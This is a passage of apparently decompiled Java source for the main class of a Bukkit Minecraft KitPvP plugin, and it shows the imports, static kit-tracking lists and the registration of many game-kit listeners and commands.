package Nodus.Main;

import java.sql.Connection;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Effect;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.craftbukkit.v1_7_R4.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockPhysicsEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scoreboard.DisplaySlot;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.Score;

import com.sk89q.worldguard.bukkit.WorldGuardPlugin;
import com.sk89q.worldguard.protection.ApplicableRegionSet;
import com.sk89q.worldguard.protection.flags.DefaultFlag;

import Nodus.Bloquinhos.jump;
import Nodus.Commands.Admin;
import Nodus.Commands.Arena;
import Nodus.Commands.AutoSoup;
import Nodus.Commands.Ban;
import Nodus.Commands.BroadCast;
import Nodus.Commands.Build;
import Nodus.Commands.ClickTest;
import Nodus.Commands.EventoMDR;
import Nodus.Commands.EventoRDM;
import Nodus.Commands.Fake;
import Nodus.Commands.Fly;
import Nodus.Commands.Gamemode;
import Nodus.Commands.Head;
import Nodus.Commands.Invis;
import Nodus.Commands.Invsee;
import Nodus.Commands.Kick;
import Nodus.Commands.LimparChatV1;
import Nodus.Commands.Ping;
import Nodus.Commands.Refil;
import Nodus.Commands.Report;
import Nodus.Commands.Skit;
import Nodus.Commands.StaffChat;
import Nodus.Commands.Suicide;
import Nodus.Commands.Tag;
import Nodus.Commands.TeleportarTodos;
import Nodus.Commands.TempBan;
import Nodus.Commands.Tphere;
import Nodus.Commands.Vis;
import Nodus.Event.Chat;
import Nodus.Event.CombatLog;
import Nodus.Event.CompassListener;
import Nodus.Event.Config;
import Nodus.Event.CopyOfCommandChat;
import Nodus.Event.DeathEvent;
import Nodus.Event.EntrarEvento;
import Nodus.Event.Events;
import Nodus.Event.NoFire;
import Nodus.Event.NoHunger;
import Nodus.Event.NoRain;
import Nodus.Event.PlacaColorida;
import Nodus.Event.Placas;
import Nodus.Event.QuitEvent;
import Nodus.Event.SwordNerf;
import Nodus.FuturaMLG.MlgGui;
import Nodus.FuturaMLG.MlgTeleport;
import Nodus.InventariosFake.GuiCabecas;
import Nodus.InventariosFake.GuiEspada;
import Nodus.InventariosFake.GuiWarp;
import Nodus.InventariosFake.MenuKits;
import Nodus.InventariosFake.MenuKits2;
import Nodus.InventariosFake.MenuKits3;
import Nodus.InventariosFake.MenuTags;
import Nodus.InventariosFake.MenuYT;
import Nodus.InventariosFake.Selector;
import Nodus.InventariosFake.TodosKit;
import Nodus.InventariosFake.TodosKit2;
import Nodus.Kits.Anchor;
import Nodus.Kits.Archer;
import Nodus.Kits.Assasin;
import Nodus.Kits.Berserker;
import Nodus.Kits.Bomber;
import Nodus.Kits.C4;
import Nodus.Kits.C4HAB;
import Nodus.Kits.Camel;
import Nodus.Kits.Confuser;
import Nodus.Kits.Critical;
import Nodus.Kits.DarkGod;
import Nodus.Kits.Dwarf;
import Nodus.Kits.Endermage;
import Nodus.Kits.Stomper;
import Nodus.Kits.Sumo;
import Nodus.Kits.Switcher;
import Nodus.Kits.Teleporter;
import Nodus.Kits.Thor;
import Nodus.Kits.Thresh;
import Nodus.Kits.Titan;
import Nodus.Kits.TnTMan;
import Nodus.Kits.Trocador;
import Nodus.Kits.Turtle;
import Nodus.Kits.Urgal;
import Nodus.Kits.Viking;
import Nodus.Kits.Viper;
import Nodus.Kits.WeakSword;
import Nodus.Kits.WitherMan;
import Nodus.Kits.Zeus;
import Nodus.Kits2.Achilles;
import Nodus.Kits2.AirMage;
import Nodus.Kits2.Avatar;
import Nodus.Kits2.Bloodgun;
import Nodus.Kits2.BurstMaster;
import Nodus.Kits2.DeathNote;
import Nodus.Kits2.DeshFire;
import Nodus.Kits2.Dj;
import Nodus.Kits2.Doctor;
import Nodus.Kits2.Drain;
import Nodus.Kits2.Flash;
import Nodus.Kits2.ForceField;
import Nodus.Kits2.Grandpa;
import Nodus.Kits2.Jutso;
import Nodus.Kits2.Magma;
import Nodus.Kits2.Necromancer;
import Nodus.Kits2.Neji;
import Nodus.Kits2.Phantom;
import Nodus.Kits2.Pyro;
import Nodus.Kits2.Rain;
import Nodus.Kits2.Rider;
import Nodus.Kits2.Ryu;
import Nodus.Kits2.Scorpion;
import Nodus.Kits2.Sniper;
import Nodus.Kits2.Sonic;
import Nodus.Kits2.SpiderMan;
import Nodus.Kits2.SubZero;
import Nodus.Kits2.Taurus;
import Nodus.Kits2.TimeLord;
import Nodus.Kits2.TrollHAB;
import Nodus.Kits2.Vaccum;
import Nodus.Kits2.Velotrol;
import Nodus.Kits3.Fireman;
import Nodus.Kits3.Fisherman;
import Nodus.Kits3.Frosty;
import Nodus.Kits3.Ghoul;
import Nodus.Kits3.Gladiator;
import Nodus.Kits3.GladiatorHAB;
import Nodus.Kits3.Granadier;
import Nodus.Kits3.Grappler;
import Nodus.Kits3.HomemPedra;
import Nodus.Kits3.Hulk;
import Nodus.Kits3.Hunter;
import Nodus.Kits3.Infernor;
import Nodus.Kits3.InfernorHab;
import Nodus.Kits3.Jellyfish;
import Nodus.Kits3.JellyfishHab;
import Nodus.Kits3.Jumper;
import Nodus.Kits3.Kangaroo;
import Nodus.Kits3.Launcher;
import Nodus.Kits3.Lobisomem;
import Nodus.Kits3.Macaco;
import Nodus.Kits3.Madman;
import Nodus.Kits3.Milkman;
import Nodus.Kits3.Monk;
import Nodus.Kits3.MonkHAb;
import Nodus.Kits3.Naruto;
import Nodus.Kits3.Ninja;
import Nodus.Kits3.NoFall;
import Nodus.Kits3.Pao;
import Nodus.Kits3.Poseidon;
import Nodus.Kits3.PvP;
import Nodus.Kits3.Reaper;
import Nodus.Kits3.Resouper;
import Nodus.Kits3.Snail;
import Nodus.Kits3.Specialist;
import Nodus.Kits3.Sponger;
import Nodus.Kits3.Terrorista;
import Nodus.Kits4.Blink;
import Nodus.Kits4.Frozem;
import Nodus.Kits4.Metheor;
import Nodus.Kits4.Vampire;
import Nodus.Managers.Stats;
import Nodus.Warp.MDR;
import Nodus.Warp.RDM;
import Nodus.Warp.Set1v1;
import Nodus.Warp.SetArena;
import Nodus.Warp.SetChallenge;
import Nodus.Warp.SetFPS;
import Nodus.Warp.SetMDR;
import Nodus.Warp.SetMain;
import Nodus.Warp.SetParkour;
import Nodus.Warp.SetRDM;
import Nodus.Warp.SetSpawn;
import Nodus.Warp.SetTextura;
import Nodus.Warp.SpawnTeleport;
import Nodus.uvu.a;
import n.d;
import net.milkbowl.vault.economy.Economy;
import net.milkbowl.vault.permission.Permission;

public class Main extends JavaPlugin implements Listener {
	public static Plugin plugin;
	public static Permission perm;
	public static FileConfiguration config;
	Config settings;
	public static ArrayList<String> staff;
	public static Connection con;
	public static ArrayList<String> reload1;
	public static Main main;
	public static Plugin pl;
	public static Main instance;
	public static Economy economy;
	public static Economy econ;
	public static Config manager;
	public static Boolean COMPASS;
	public static Boolean AUTO_COMPASS;
	public static Permission permission;
	public Sts status;
	public static Permission perms;
	public static List<String> lista;
	public List<String> weak;
	public List<String> hadouken;
	public static ArrayList<String> usandokit;
	public static ArrayList<String> Zeus;
	public static ArrayList<String> neji;
	public static ArrayList<String> qd;
	public static ArrayList<String> terrorista;
	public static ArrayList<String> anchor;
	public static ArrayList<String> Magma;
	public static ArrayList<String> stomper;
	public static final List<Player> invencivel;
	public static ArrayList<String> Blink;
	public static ArrayList<String> thor;
	public static ArrayList<String> Vampire;
	public static ArrayList<String> weaksword;
	public static ArrayList<String> spiderman;
	public static ArrayList<String> pyro;
	public static ArrayList<String> assasin;
	public static ArrayList<String> viking;
	public static ArrayList<String> specialist;
	public static ArrayList<String> confuser;
	public static ArrayList<String> MadMan;
	public static ArrayList<String> Frozem;
	public static ArrayList<String> critical;
	public static ArrayList<String> Grandpa;
	public static ArrayList<Player> Players;
	public static ArrayList<String> lobisomem;
	public static ArrayList<String> grappler;
	public static ArrayList<String> vacuum;
	public static ArrayList<String> c4;
	public static ArrayList<String> titan;
	public static ArrayList<String> barbarian;
	public static ArrayList<String> reaper;
	public static ArrayList<String> launcher;
	public static ArrayList<String> Barbarian;
	public static ArrayList<String> dropspawn;
	public static ArrayList<String> endermage;
	public static List<String> OiDecompilerEz2;
	public static List<String> Ferro2;
	public static List<String> Red2;
	public static List<String> Terra2;
	public static List<Player> Tempo;
	public static ArrayList<String> ryu;
	public static ArrayList<String> switcher;
	public static ArrayList<String> gambler;
	public static ArrayList<String> resouper;
	public static ArrayList<String> quickdropper;
	public static ArrayList<String> berserker;
	public static ArrayList<String> darkgod;
	public static ArrayList<String> SubZeroarrow;
	public static ArrayList<String> dwarf;
	public static ArrayList<String> hulk;
	public static ArrayList<String> homempedra;
	public static ArrayList<String> sumo;
	public static ArrayList<String> camel;
	public static ArrayList<String> naruto;
	public static ArrayList<String> poseidon;
	public static ArrayList<String> sponger;
	public static ArrayList<String> teleporter;
	public static ArrayList<String> urgal;
	public static ArrayList<String> InfernoHab;
	public static ArrayList<String> kangaroo;
	public static ArrayList<String> infernor;
	public static ArrayList<String> hunter;
	public static ArrayList<String> frosty;
	public static ArrayList<String> bomber;
	public static ArrayList<String> ghoul;
	public static ArrayList<String> phantom;
	public static ArrayList<String> fireman;
	public static ArrayList<String> homemaranha;
	public static ArrayList<String> milkman;
	public static ArrayList<String> viper;
	public static ArrayList<String> snail;
	public static ArrayList<String> cooldown;
	public static ArrayList<String> copycat;
	public static ArrayList<String> gladiator;
	public static ArrayList<String> turtle;
	public static ArrayList<String> spao;
	public static ArrayList<String> ninja;
	public static ArrayList<String> jellyfish;
	public static ArrayList<String> hg;
	public static ArrayList<String> monk;
	public static ArrayList<String> fisherman;
	public static ArrayList<String> granadier;
	public static ArrayList<String> archer;
	public static ArrayList<Player> admin;
	public static ArrayList<String> sniper;
	public static ArrayList<String> Dj;
	public static ArrayList<String> trocador;
	public static ArrayList<String> jp;
	public static ArrayList<String> troll;
	public static ArrayList<String> witherman;
	public static ArrayList<String> Exploder;
	public static ArrayList<String> achilles;
	public static ArrayList<String> nofall;
	public static ArrayList<String> Avatar;
	public static ArrayList<String> Sonic;
	public static ArrayList<String> Deshfire;
	public static ArrayList<String> Taurus;
	public static ArrayList<String> scorpionarrow;
	public static ArrayList<String> Necromancer;
	public static ArrayList<String> velo;
	public static ArrayList<String> blood;
	public static ArrayList<String> mlg;
	public static ArrayList<String> p;
	public static ArrayList<String> master;
	public static ArrayList<String> forcefield;
	public static ArrayList<String> ffd;
	public static ArrayList<String> dn;
	public static ArrayList<String> kr;
	public static ArrayList<String> freshi;
	public static ArrayList<String> riu;
	public static ArrayList<String> rain;
	public static ArrayList<String> jutso;
	public static ArrayList<String> rider;
	public static ArrayList<String> viadin;
	public static ArrayList<String> ct;
	public static List<Player> cooldownm;
	public static ArrayList<String> timelord;
	public static ArrayList<String> AirMage;
	public static ArrayList<String> AvatarH;
	public static ArrayList<String> mute;
	public static ArrayList<String> Metheor;
	public static ArrayList<String> Macaco;
	public int uniquePlayers;
	Calendar date;
	public static int cu;
	public static ArrayList<Block> naoescorrer;

	static {
		Main.perm = null;
		Main.staff = new ArrayList<String>();
		Main.reload1 = new ArrayList<String>();
		Main.econ = null;
		Main.COMPASS = true;
		Main.AUTO_COMPASS = false;
		Main.permission = null;
		Main.perms = null;
		Main.lista = new ArrayList<String>();
		Main.usandokit = new ArrayList<String>();
		Main.Zeus = new ArrayList<String>();
		Main.neji = new ArrayList<String>();
		Main.qd = new ArrayList<String>();
		Main.terrorista = new ArrayList<String>();
		Main.anchor = new ArrayList<String>();
		Main.Magma = new ArrayList<String>();
		Main.stomper = new ArrayList<String>();
		invencivel = new ArrayList<Player>();
		Main.Blink = new ArrayList<String>();
		Main.thor = new ArrayList<String>();
		Main.Vampire = new ArrayList<String>();
		Main.weaksword = new ArrayList<String>();
		Main.spiderman = new ArrayList<String>();
		Main.pyro = new ArrayList<String>();
		Main.assasin = new ArrayList<String>();
		Main.viking = new ArrayList<String>();
		Main.specialist = new ArrayList<String>();
		Main.confuser = new ArrayList<String>();
		Main.MadMan = new ArrayList<String>();
		Main.Frozem = new ArrayList<String>();
		Main.critical = new ArrayList<String>();
		Main.Grandpa = new ArrayList<String>();
		Main.Players = new ArrayList<Player>();
		Main.lobisomem = new ArrayList<String>();
		Main.grappler = new ArrayList<String>();
		Main.vacuum = new ArrayList<String>();
		Main.c4 = new ArrayList<String>();
		Main.titan = new ArrayList<String>();
		Main.barbarian = new ArrayList<String>();
		Main.reaper = new ArrayList<String>();
		Main.launcher = new ArrayList<String>();
		Main.Barbarian = new ArrayList<String>();
		Main.dropspawn = new ArrayList<String>();
		Main.endermage = new ArrayList<String>();
		Main.OiDecompilerEz2 = new ArrayList<String>();
		Main.Ferro2 = new ArrayList<String>();
		Main.Red2 = new ArrayList<String>();
		Main.Terra2 = new ArrayList<String>();
		Main.Tempo = new ArrayList<Player>();
		Main.ryu = new ArrayList<String>();
		Main.switcher = new ArrayList<String>();
		Main.gambler = new ArrayList<String>();
		Main.resouper = new ArrayList<String>();
		Main.quickdropper = new ArrayList<String>();
		Main.berserker = new ArrayList<String>();
		Main.darkgod = new ArrayList<String>();
		Main.SubZeroarrow = new ArrayList<String>();
		Main.dwarf = new ArrayList<String>();
		Main.hulk = new ArrayList<String>();
		Main.homempedra = new ArrayList<String>();
		Main.sumo = new ArrayList<String>();
		Main.camel = new ArrayList<String>();
		Main.naruto = new ArrayList<String>();
		Main.poseidon = new ArrayList<String>();
		Main.sponger = new ArrayList<String>();
		Main.teleporter = new ArrayList<String>();
		Main.urgal = new ArrayList<String>();
		Main.InfernoHab = new ArrayList<String>();
		Main.kangaroo = new ArrayList<String>();
		Main.infernor = new ArrayList<String>();
		Main.hunter = new ArrayList<String>();
		Main.frosty = new ArrayList<String>();
		Main.bomber = new ArrayList<String>();
		Main.ghoul = new ArrayList<String>();
		Main.phantom = new ArrayList<String>();
		Main.fireman = new ArrayList<String>();
		Main.homemaranha = new ArrayList<String>();
		Main.milkman = new ArrayList<String>();
		Main.viper = new ArrayList<String>();
		Main.snail = new ArrayList<String>();
		Main.cooldown = new ArrayList<String>();
		Main.copycat = new ArrayList<String>();
		Main.gladiator = new ArrayList<String>();
		Main.turtle = new ArrayList<String>();
		Main.spao = new ArrayList<String>();
		Main.ninja = new ArrayList<String>();
		Main.jellyfish = new ArrayList<String>();
		Main.hg = new ArrayList<String>();
		Main.monk = new ArrayList<String>();
		Main.fisherman = new ArrayList<String>();
		Main.granadier = new ArrayList<String>();
		Main.archer = new ArrayList<String>();
		Main.admin = new ArrayList<Player>();
		Main.sniper = new ArrayList<String>();
		Main.Dj = new ArrayList<String>();
		Main.trocador = new ArrayList<String>();
		Main.jp = new ArrayList<String>();
		Main.troll = new ArrayList<String>();
		Main.witherman = new ArrayList<String>();
		Main.Exploder = new ArrayList<String>();
		Main.achilles = new ArrayList<String>();
		Main.nofall = new ArrayList<String>();
		Main.Avatar = new ArrayList<String>();
		Main.Sonic = new ArrayList<String>();
		Main.Deshfire = new ArrayList<String>();
		Main.Taurus = new ArrayList<String>();
		Main.scorpionarrow = new ArrayList<String>();
		Main.Necromancer = new ArrayList<String>();
		Main.velo = new ArrayList<String>();
		Main.blood = new ArrayList<String>();
		Main.mlg = new ArrayList<String>();
		Main.p = new ArrayList<String>();
		Main.master = new ArrayList<String>();
		Main.forcefield = new ArrayList<String>();
		Main.ffd = new ArrayList<String>();
		Main.dn = new ArrayList<String>();
		Main.kr = new ArrayList<String>();
		Main.freshi = new ArrayList<String>();
		Main.riu = new ArrayList<String>();
		Main.rain = new ArrayList<String>();
		Main.jutso = new ArrayList<String>();
		Main.rider = new ArrayList<String>();
		Main.viadin = new ArrayList<String>();
		Main.ct = new ArrayList<String>();
		Main.cooldownm = new ArrayList<Player>();
		Main.timelord = new ArrayList<String>();
		Main.AirMage = new ArrayList<String>();
		Main.AvatarH = new ArrayList<String>();
		Main.mute = new ArrayList<String>();
		Main.Metheor = new ArrayList<String>();
		Main.Macaco = new ArrayList<String>();
		Main.cu = Material.PAPER.getId();
		Main.naoescorrer = new ArrayList<Block>();
	}

	public Main() {
		this.settings = Config.getInstance();
		this.status = Sts.instance;
		this.weak = new ArrayList<String>();
		this.hadouken = new ArrayList<String>();
		this.uniquePlayers = 0;
		this.date = Calendar.getInstance();
	}

	public static Main getInstance() {
		return Main.instance;
	}

	public static Plugin getPlugin() {
		return Main.plugin;
	}

	public void onEnable() {
		this.settings.setup((Plugin) this);
		this.setupEconomy();
		this.getConfig().options().copyDefaults(true);
		this.getConfig().options().copyHeader(true);
		this.saveConfig();
		Main.instance = this;
		Main.plugin = (Plugin) this;
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		Bukkit.getConsoleSender().sendMessage("§B NEWWOLDPLAY EZ [xNodusPvP dlc]  ");
		final PluginManager pm = Bukkit.getPluginManager();
		pm.registerEvents((Listener) new Build(), (Plugin) this);
		pm.registerEvents((Listener) new C4HAB(), (Plugin) this);
		pm.registerEvents((Listener) new BossKits(this), (Plugin) this);
		pm.registerEvents((Listener) new DeathEvent(this), (Plugin) this);
		pm.registerEvents((Listener) new CombatLog(this), (Plugin) this);
		pm.registerEvents((Listener) new InfernorHab(this), (Plugin) this);
		pm.registerEvents((Listener) new Sniper(this), (Plugin) this);
		pm.registerEvents((Listener) new QuitEvent(), (Plugin) this);
		pm.registerEvents((Listener) new Placas(this), (Plugin) this);
		pm.registerEvents((Listener) new Chat(), (Plugin) this);
		pm.registerEvents((Listener) new NoHunger(), (Plugin) this);
		pm.registerEvents((Listener) new Stomper(this), (Plugin) this);
		pm.registerEvents((Listener) new NoRain(), (Plugin) this);
		pm.registerEvents((Listener) new NoFire(), (Plugin) this);
		pm.registerEvents((Listener) new Phantom(this), (Plugin) this);
		pm.registerEvents((Listener) new MenuKits3(), (Plugin) this);
		pm.registerEvents((Listener) new NoFall(this), (Plugin) this);
		pm.registerEvents((Listener) this, (Plugin) this);
		pm.registerEvents((Listener) new PlacaColorida(this), (Plugin) this);
		pm.registerEvents((Listener) new Arena(), (Plugin) this);
		pm.registerEvents((Listener) new GuiWarp(this), (Plugin) this);
		pm.registerEvents((Listener) new Anchor(this), (Plugin) this);
		pm.registerEvents((Listener) new EntrarEvento(this), (Plugin) this);
		pm.registerEvents((Listener) new Archer(this), (Plugin) this);
		pm.registerEvents((Listener) new Nodus.Kits.Barbarian(this), (Plugin) this);
		pm.registerEvents((Listener) new Camel(this), (Plugin) this);
		pm.registerEvents((Listener) new Endermage(this), (Plugin) this);
		pm.registerEvents((Listener) new DarkGod(this), (Plugin) this);
		pm.registerEvents((Listener) new C4(this), (Plugin) this);
		pm.registerEvents((Listener) new Fisherman(this), (Plugin) this);
		pm.registerEvents((Listener) new Milkman(this), (Plugin) this);
		pm.registerEvents((Listener) new Sumo(this), (Plugin) this);
		pm.registerEvents((Listener) new Admin(), (Plugin) this);
		pm.registerEvents((Listener) new a(this), (Plugin) this);
		pm.registerEvents((Listener) new Confuser(this), (Plugin) this);
		pm.registerEvents((Listener) new Assasin(this), (Plugin) this);
		pm.registerEvents((Listener) new Fireman(this), (Plugin) this);
		pm.registerEvents((Listener) new SpawnTeleport(this), (Plugin) this);
		pm.registerEvents((Listener) new Grappler(this), (Plugin) this);
		pm.registerEvents((Listener) new Fly(), (Plugin) this);
		pm.registerEvents((Listener) new Teleporter(this), (Plugin) this);
		pm.registerEvents((Listener) new Skit(), (Plugin) this);
		pm.registerEvents((Listener) new Fake(this), (Plugin) this);
		pm.registerEvents((Listener) new Head(this), (Plugin) this);
		pm.registerEvents((Listener) new EventoMDR(), (Plugin) this);
		pm.registerEvents((Listener) new TodosKit2(), (Plugin) this);
		pm.registerEvents((Listener) new LimparChatV1(), (Plugin) this);
		pm.registerEvents((Listener) new Report(this), (Plugin) this);
		pm.registerEvents((Listener) new TeleportarTodos(), (Plugin) this);
		pm.registerEvents((Listener) new Suicide(), (Plugin) this);
		pm.registerEvents((Listener) new Gamemode(), (Plugin) this);
		pm.registerEvents((Listener) new GladiatorHAB(this), (Plugin) this);
		pm.registerEvents((Listener) new Jellyfish(this), (Plugin) this);
		pm.registerEvents((Listener) new Titan(this), (Plugin) this);
		pm.registerEvents((Listener) new Thor(this), (Plugin) this);
		pm.registerEvents((Listener) new Specialist(this), (Plugin) this);
		pm.registerEvents((Listener) new WeakSword(this), (Plugin) this);
		pm.registerEvents((Listener) new Hulk(this), (Plugin) this);
		pm.registerEvents((Listener) new Viking(this), (Plugin) this);
		pm.registerEvents((Listener) new Critical(this), (Plugin) this);
		pm.registerEvents((Listener) new Reaper(this), (Plugin) this);
		pm.registerEvents((Listener) new Infernor(this), (Plugin) this);
		pm.registerEvents((Listener) new Dwarf(this), (Plugin) this);
		pm.registerEvents((Listener) new Kangaroo(this), (Plugin) this);
		pm.registerEvents((Listener) new MonkHAb(this), (Plugin) this);
		pm.registerEvents((Listener) new Ninja(this), (Plugin) this);
		pm.registerEvents((Listener) new Naruto(this), (Plugin) this);
		pm.registerEvents((Listener) new Launcher(this), (Plugin) this);
		pm.registerEvents((Listener) new Resouper(this), (Plugin) this);
		pm.registerEvents((Listener) new Poseidon(this), (Plugin) this);
		pm.registerEvents((Listener) new Berserker(this), (Plugin) this);
		pm.registerEvents((Listener) new HomemPedra(this), (Plugin) this);
		pm.registerEvents((Listener) new Hunter(this), (Plugin) this);
		pm.registerEvents((Listener) new Selector(this), (Plugin) this);
		pm.registerEvents((Listener) new Stomper(this), (Plugin) this);
		pm.registerEvents((Listener) new Snail(this), (Plugin) this);
		pm.registerEvents((Listener) new Granadier(this), (Plugin) this);
		pm.registerEvents((Listener) new Frosty(this), (Plugin) this);
		pm.registerEvents((Listener) new Lobisomem(this), (Plugin) this);
		pm.registerEvents((Listener) new Ghoul(this), (Plugin) this);
		pm.registerEvents((Listener) new Switcher(this), (Plugin) this);
		pm.registerEvents((Listener) new Viper(this), (Plugin) this);
		pm.registerEvents((Listener) new Turtle(this), (Plugin) this);
		pm.registerEvents((Listener) new JellyfishHab(this), (Plugin) this);
		pm.registerEvents((Listener) new Trocador(this), (Plugin) this);
		pm.registerEvents((Listener) new MenuKits(this), (Plugin) this);
		pm.registerEvents((Listener) new MenuKits2(), (Plugin) this);
		pm.registerEvents((Listener) new GuiEspada(), (Plugin) this);
		pm.registerEvents((Listener) new MenuYT(this), (Plugin) this);
		pm.registerEvents((Listener) new SwordNerf(this), (Plugin) this);
		pm.registerEvents((Listener) new Jumper(this), (Plugin) this);
		pm.registerEvents((Listener) new jump(this), (Plugin) this);
		pm.registerEvents((Listener) this, (Plugin) this);
		pm.registerEvents((Listener) new PvP(this), (Plugin) this);
		pm.registerEvents((Listener) new Stats(this), (Plugin) this);
		pm.registerEvents((Listener) new Dj(this), (Plugin) this);
		pm.registerEvents((Listener) new SpiderMan(this), (Plugin) this);
		pm.registerEvents((Listener) new Madman(this), (Plugin) this);
		pm.registerEvents((Listener) this, (Plugin) this);
		pm.registerEvents((Listener) new WitherMan(this), (Plugin) this);
		pm.registerEvents((Listener) new TnTMan(this), (Plugin) this);
		pm.registerEvents((Listener) new Achilles(this), (Plugin) this);
		pm.registerEvents((Listener) new Vaccum(this), (Plugin) this);
		pm.registerEvents((Listener) new CompassListener(this), (Plugin) this);
		pm.registerEvents((Listener) new Sponger(this), (Plugin) this);
		pm.registerEvents((Listener) new Scorpion(this), (Plugin) this);
		pm.registerEvents((Listener) new Necromancer(this), (Plugin) this);
		pm.registerEvents((Listener) new TodosKit(), (Plugin) this);
		pm.registerEvents((Listener) new Events(this), (Plugin) this);
		pm.registerEvents((Listener) new Phantom(this), (Plugin) this);
		pm.registerEvents((Listener) new Bloodgun(this), (Plugin) this);
		pm.registerEvents((Listener) new Sonic(this), (Plugin) this);
		pm.registerEvents((Listener) new DeshFire(this), (Plugin) this);
		pm.registerEvents((Listener) new Velotrol(this), (Plugin) this);
		pm.registerEvents((Listener) new GuiCabecas(this), (Plugin) this);
		pm.registerEvents((Listener) new Sniper(this), (Plugin) this);
		pm.registerEvents((Listener) new TrollHAB(this), (Plugin) this);
		pm.registerEvents((Listener) new BurstMaster(this), (Plugin) this);
		pm.registerEvents((Listener) new ForceField(this), (Plugin) this);
		pm.registerEvents((Listener) new Taurus(this), (Plugin) this);
		pm.registerEvents((Listener) new DeathNote(this), (Plugin) this);
		pm.registerEvents((Listener) new Doctor(this), (Plugin) this);
		pm.registerEvents((Listener) new Urgal(this), (Plugin) this);
		pm.registerEvents((Listener) new Ryu(this), (Plugin) this);
		pm.registerEvents((Listener) new Flash(this), (Plugin) this);
		pm.registerEvents((Listener) new Rider(this), (Plugin) this);
		pm.registerEvents((Listener) new Jutso(this), (Plugin) this);
		pm.registerEvents((Listener) new Rain(this), (Plugin) this);
		pm.registerEvents((Listener) new Drain(this), (Plugin) this);
		pm.registerEvents((Listener) new Madman(this), (Plugin) this);
		pm.registerEvents((Listener) new TimeLord(this), (Plugin) this);
		pm.registerEvents((Listener) new Magma(this), (Plugin) this);
		pm.registerEvents((Listener) new Neji(this), (Plugin) this);
		pm.registerEvents((Listener) new Drain(this), (Plugin) this);
		pm.registerEvents((Listener) new MenuTags(this), (Plugin) this);
		pm.registerEvents((Listener) new MlgGui(this), (Plugin) this);
		pm.registerEvents((Listener) new Thresh(this), (Plugin) this);
		pm.registerEvents((Listener) new Zeus(this), (Plugin) this);
		pm.registerEvents((Listener) new Avatar(this), (Plugin) this);
		pm.registerEvents((Listener) new Nodus.Kits3.Barbarian(this), (Plugin) this);
		pm.registerEvents((Listener) new Macaco(this), (Plugin) this);
		pm.registerEvents((Listener) new AirMage(this), (Plugin) this);
		this.getCommand("neji").setExecutor((CommandExecutor) new Neji(this));
		this.getCommand("rider").setExecutor((CommandExecutor) new Rider(this));
		this.getCommand("zeus").setExecutor((CommandExecutor) new Zeus(this));
		this.getCommand("jutso").setExecutor((CommandExecutor) new Jutso(this));
		this.getCommand("setarena").setExecutor((CommandExecutor) new SetArena(this));
		this.getCommand("phantom").setExecutor((CommandExecutor) new Phantom(this));
		this.getCommand("pao").setExecutor((CommandExecutor) new Pao(this));
		this.getCommand("anchor").setExecutor((CommandExecutor) new Anchor(this));
		this.getCommand("chat").setExecutor((CommandExecutor) new CopyOfCommandChat());
